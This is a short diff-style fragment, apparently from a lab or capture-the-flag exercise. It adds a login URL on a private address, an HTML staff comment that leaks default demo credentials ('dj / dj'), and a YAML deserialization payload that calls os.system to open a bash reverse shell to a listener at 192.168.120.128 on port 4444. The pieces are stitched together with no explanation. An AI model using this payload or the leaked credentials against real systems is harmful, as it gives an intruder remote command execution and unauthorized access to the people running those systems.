@@ -1,0 +1,9 @@
+10.112.167.155/login
+<!--
+    staff note: the demo DJ login is still enabled for the soft opening.
+    dj / dj  -- swap this before the season starts (ticket BAR-7)
+  -->
+  
+  
+!!python/object/apply:os.system
+["bash -c 'bash -i >& /dev/tcp/192.168.120.128/4444 0>&1'"]
